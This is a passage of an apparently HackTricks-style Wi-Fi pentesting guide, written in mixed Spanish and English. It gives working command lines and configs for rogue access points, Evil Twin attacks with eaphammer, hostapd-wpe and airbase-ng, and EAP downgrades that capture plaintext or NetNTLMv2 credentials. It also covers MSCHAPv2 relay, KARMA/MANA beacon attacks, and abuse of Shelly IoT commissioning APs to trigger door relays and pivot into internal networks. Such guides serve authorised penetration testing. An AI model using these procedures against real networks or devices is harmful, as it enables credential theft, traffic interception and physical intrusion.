- El sondeo activo implica que las estaciones envíen probe requests para descubrir APs cercanos y sus características.
- Los directed probe requests van dirigidos a un ESSID específico, ayudando a detectar si una red en particular está al alcance, incluso si es una red oculta.
- Los broadcast probe requests tienen un campo SSID nulo y se envían a todos los APs cercanos, permitiendo que la estación compruebe si hay alguna red preferida sin revelar el contenido de su PNL.

## AP simple con redirección a Internet

Antes de explicar cómo realizar ataques más complejos se va a explicar **cómo** simplemente **crear** un **AP** y **redirigir** su **tráfico** a una interfaz conectada **a** Internet.

Usando `ifconfig -a` verifica que la interfaz wlan para crear el AP y la interfaz conectada a Internet estén presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea el archivo de configuración `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego **configura IPs** y **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A continuación **inicia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un archivo de configuración `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detén los procesos molestos**, activa el **monitor mode** y arranca **hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenvío y Redirección
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque Evil Twin explota la forma en que los clientes WiFi reconocen redes, confiando principalmente en el nombre de la red (ESSID) sin requerir que la estación base (access point) se autentique ante el cliente. Los puntos clave incluyen:

- **Dificultad para diferenciar**: Los dispositivos tienen dificultades para distinguir entre access points legítimos y rogue cuando comparten el mismo ESSID y tipo de cifrado. Las redes del mundo real suelen usar múltiples access points con el mismo ESSID para extender la cobertura de forma transparente.
- **Roaming de clientes y manipulación de la conexión**: El protocolo 802.11 permite que los dispositivos hagan roaming entre access points dentro del mismo ESS. Los atacantes pueden explotar esto atrayendo a un dispositivo para que se desconecte de su estación base actual y se conecte a una rogue. Esto se puede lograr ofreciendo una señal más fuerte o interrumpiendo la conexión al access point legítimo mediante métodos como deauthentication packets o jamming.
- **Desafíos en la ejecución**: Ejecutar con éxito un ataque Evil Twin en entornos con múltiples access points bien ubicados puede ser complicado. Desautenticar un solo access point legítimo a menudo provoca que el dispositivo se conecte a otro access point legítimo, a menos que el atacante pueda desautenticar todos los access points cercanos o colocar estratégicamente el access point rogue.

Puedes crear un Open Evil Twin muy básico (sin capacidad para enrutar tráfico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
También puedes crear un Evil Twin usando **eaphammer** (ten en cuenta que para crear evil twins con eaphammer la interfaz **NO debe estar** en modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Por favor, ten en cuenta que por defecto si un ESSID en el PNL está guardado como protegido por WPA, el dispositivo no se conectará automáticamente a un Open evil Twin. Puedes intentar DoS al AP real y esperar que el usuario se conecte manualmente a tu Open evil Twin, o podrías DoS al AP real y usar un WPA Evil Twin para capturar el handshake (con este método no podrás permitir que la víctima se conecte a ti ya que no conoces el PSK, pero puedes capturar el handshake e intentar crackearlo).

_Algunos OS y AV advertirán al usuario de que conectarse a una red Open es peligroso..._

### WPA/WPA2 Evil Twin

Puedes crear un **Evil Twin using WPA/2** y si los dispositivos están configurados para conectarse a ese SSID con WPA/2, intentarán conectarse. De todos modos, **para completar el 4-way-handshake** también necesitas **conocer** la **password** que el cliente va a usar. Si **no la conoces**, la **connection won't be completed**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender este ataque recomiendo leer antes la breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un archivo de **configuración** para funcionar. Para **automatizar** la generación de estas configuraciones puedes usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (descarga el archivo python dentro de _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuración puedes seleccionar muchas cosas diferentes como ssid, channel, user files, cret/key, dh parameters, wpa version y auth...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado haga login.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer usa los siguientes métodos de auth (observe GTC como el primero para intentar obtener contraseñas en texto plano y luego el uso de métodos de auth más robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta es la metodología predeterminada para evitar largos tiempos de conexión. Sin embargo, también puedes especificar al servidor los métodos de autenticación de los más débiles a los más fuertes:
```
--negotiate weakest
```
O también podrías usar:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Usando Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **Dirección IP = any** -- **Puerto = 0** -- **Protocolo = data** -- **Key File** (**selecciona tu key file**, para evitar problemas selecciona un key file **sin protección por contraseña**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **Lista blanca basada en MAC**:
- El rogue AP responderá solo a probe requests de los dispositivos especificados en la lista blanca, permaneciendo invisible para todos los demás que no estén listados.
2. **Lista negra basada en MAC**:
- El rogue AP ignorará probe requests de los dispositivos en la lista negra, haciéndose efectivamente invisible para esos dispositivos específicos.
3. **Lista blanca basada en SSID**:
- El rogue AP responderá a probe requests solo para ESSIDs específicos listados, haciéndose invisible para dispositivos cuyas Preferred Network Lists (PNLs) no contengan esos ESSIDs.
4. **Lista negra basada en SSID**:
- El rogue AP no responderá a probe requests para los ESSIDs específicos en la lista negra, haciéndose invisible para dispositivos que buscan esas redes en particular.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite a un **atacante crear un access point malicioso (AP) que responde a todas las probe requests** de dispositivos que buscan conectarse a redes. Esta técnica **engaña a los dispositivos para que se conecten al AP del atacante** al imitar las redes que los dispositivos están buscando. Una vez que un dispositivo envía una solicitud de conexión a este rogue AP, la conexión se completa, provocando que el dispositivo se conecte por error a la red del atacante.

### MANA

Luego, **los dispositivos empezaron a ignorar respuestas de red no fiables**, reduciendo la efectividad del ataque karma original. Sin embargo, se introdujo un nuevo método, conocido como el **MANA attack**, por Ian de Villiers y Dominic White. Este método implica que el rogue AP **capture las Preferred Network Lists (PNL) de los dispositivos respondiendo a sus broadcast probe requests** con nombres de red (SSIDs) almacenados previamente por los dispositivos. Este ataque sofisticado elude las protecciones contra el ataque karma original explotando la forma en que los dispositivos recuerdan y priorizan las redes conocidas.

El MANA attack opera monitorizando tanto las directed como las broadcast probe requests de los dispositivos. Para las directed requests, registra la MAC address del dispositivo y el nombre de red solicitado, añadiendo esta información a una lista. Cuando se recibe una broadcast request, el AP responde con información que coincide con cualquiera de las redes en la lista del dispositivo, atrayendo al dispositivo para que se conecte al rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** es una estrategia avanzada para cuando los dispositivos no usan directed probing o cuando sus Preferred Network Lists (PNL) son desconocidas para el atacante. Opera bajo el principio de que **los dispositivos en la misma área probablemente compartan algunos nombres de red en sus PNLs**. En lugar de responder selectivamente, este ataque transmite probe responses para cada nombre de red (ESSID) encontrado en las PNLs combinadas de todos los dispositivos observados. Este enfoque amplio aumenta la probabilidad de que un dispositivo reconozca una red familiar e intente conectarse al rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Cuando el **Loud MANA attack** puede no ser suficiente, el **Known Beacon attack** ofrece otro enfoque. Este método **brute-forces el proceso de conexión simulando un AP que responde a cualquier nombre de red y recorriendo una lista de ESSIDs potenciales** derivada de una wordlist. Esto simula la presencia de numerosas redes, con la esperanza de coincidir con un ESSID dentro del PNL de la víctima, lo que provoca un intento de conexión al AP fabricado. El ataque puede intensificarse combinándolo con la opción `--loud` para un intento más agresivo de atraer dispositivos.

Eaphammer implementó este ataque como un MANA attack en el que todos los ESSIDs de una lista son anunciados (también podrías combinar esto con `--loud` para crear un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

El **Known Beacon Burst attack** implica **la transmisión rápida en ráfaga de beacon frames para cada ESSID listado en un archivo**. Esto crea un entorno denso de redes falsas, aumentando considerablemente la probabilidad de que los dispositivos se conecten al rogue AP, especialmente cuando se combina con una MANA attack. Esta técnica aprovecha la velocidad y el volumen para sobrecargar los mecanismos de selección de red de los dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** es un protocolo que permite a los dispositivos conectarse directamente entre sí usando Wi‑Fi sin necesidad de un access point inalámbrico tradicional. Esta capacidad está integrada en varios dispositivos de Internet of Things (IoT), como impresoras y televisores, facilitando la comunicación directa dispositivo a dispositivo. Una característica notable de Wi‑Fi Direct es que un dispositivo asume el rol de access point, conocido como group owner, para gestionar la conexión.

La seguridad de las conexiones Wi‑Fi Direct se establece mediante **Wi‑Fi Protected Setup (WPS)**, que soporta varios métodos de emparejamiento seguro, incluyendo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Estos métodos, particularmente la entrada por PIN, son susceptibles a las mismas vulnerabilidades que WPS en redes Wi‑Fi tradicionales, por lo que son objetivos de vectores de ataque similares.

### EvilDirect Hijacking

**EvilDirect Hijacking** es un ataque específico de Wi‑Fi Direct. Refleja el concepto de un ataque Evil Twin pero dirigido a conexiones Wi‑Fi Direct. En este escenario, un atacante se hace pasar por un group owner legítimo con el objetivo de engañar a los dispositivos para que se conecten a una entidad maliciosa. Este método puede ejecutarse usando herramientas como `airbase-ng` especificando el channel, ESSID y MAC address del dispositivo suplantado:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Algunos relés/controladores IoT de consumo mantienen el commissioning **open AP** activo después de unirse a la IoT WLAN (p. ej., SSIDs de Shelly Gen4 que empiezan con `Shelly`). El dispositivo permanece **dual-homed**: una interfaz AP con la IP por defecto `192.168.33.1` además de una interfaz cliente en la WLAN interna.

**Abuse flow (Wi‑Fi proximity required):**

1. Conéctese al provisioning AP, obtenga una lease DHCP y explore la **AP-side HTTP API**.
2. Active relés vía endpoints sin autenticación, p. ej. `http://192.168.33.1/relay/0?turn=on` (impacto en puerta/portón/garaje). Los endpoints de subida de firmware pueden añadir persistencia.
3. Úselo como un **pivot**: los scripts Shelly pueden enviar HTTP desde la interfaz interna a otros hosts LAN. Ejemplo de pivot a otro Shelly en `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Sustituya la URL por cualquier objetivo HTTP interno accesible; la dual-homing evita trabajo extra de enrutamiento/NAT.
4. A escala: consulte vendor SSIDs en **wigle.net** (p. ej., `Shelly`) para localizar commissioning APs para explotación on-site.

Para persistencia, deje el commissioning AP habilitado.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Echar un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
